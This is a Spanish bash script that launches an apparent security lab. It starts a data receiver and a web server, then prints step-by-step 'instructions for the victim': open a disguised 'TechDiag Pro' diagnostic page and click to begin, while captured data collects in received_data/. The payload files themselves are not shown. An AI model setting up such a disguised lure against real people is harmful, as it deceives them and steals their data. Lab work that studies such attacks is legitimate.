#!/bin/bash
# Script de inicio del laboratorio con interfaz web
# =================================================

echo "🌐 LABORATORIO DE SEGURIDAD - INTERFAZ WEB"
echo "=========================================="

# Verificar archivos necesarios
required_files=("data_receiver.py" "index.html" "system_monitor.py" "reconstructor.py")
missing_files=()

for file in "${required_files[@]}"; do
    if [ ! -f "$file" ]; then
        missing_files+=("$file")
    fi
done

if [ ${#missing_files[@]} -ne 0 ]; then
    echo "❌ Archivos requeridos no encontrados:"
    for file in "${missing_files[@]}"; do
        echo "   - $file"
    done
    exit 1
fi

echo "✅ Todos los archivos necesarios encontrados"
echo ""

# Función para manejar Ctrl+C
cleanup() {
    echo -e "\n🛑 Deteniendo servicios..."
    jobs -p | xargs -r kill >/dev/null 2>&1
    echo "✅ Laboratorio detenido"
    exit 0
}

trap cleanup SIGINT

echo "🚀 Iniciando servicios del laboratorio..."
echo ""

# Iniciar receptor de datos en background
echo "📡 Iniciando receptor de datos (puerto 8080)..."
python3 data_receiver.py --port 8080 &
RECEIVER_PID=$!

# Esperar un poco
sleep 2

# Iniciar servidor web en background
echo "🌐 Iniciando servidor web con interfaz (puerto 8000)..."
python3 -m http.server 8000 >/dev/null 2>&1 &
WEB_PID=$!

echo ""
echo "✅ ¡Laboratorio iniciado correctamente!"
echo "=" * 50
echo "📊 Receptor de datos: puerto 8080 (activo)"
echo "🌐 Interfaz web: http://10.0.2.15:8000"
echo "📂 Página principal: index.html"
echo ""
echo "🎯 INSTRUCCIONES PARA LA VÍCTIMA:"
echo "================================="
echo "1. Abrir navegador en máquina víctima"
echo "2. Ir a: http://10.0.2.15:8000"
echo "3. Ver interfaz 'TechDiag Pro'"
echo "4. Hacer clic en 'Iniciar Diagnóstico Completo'"
echo "5. Seguir instrucciones mostradas"
echo ""
echo "📈 MONITOREO:"
echo "============"
echo "- Los datos capturados aparecerán en tiempo real arriba"
echo "- Archivos guardados en: received_data/"
echo "- Ver preview de texto capturado en consola"
echo ""
echo "⚠️  Presiona Ctrl+C para detener todo el laboratorio"
echo ""

# Esperar a que terminen los procesos
wait
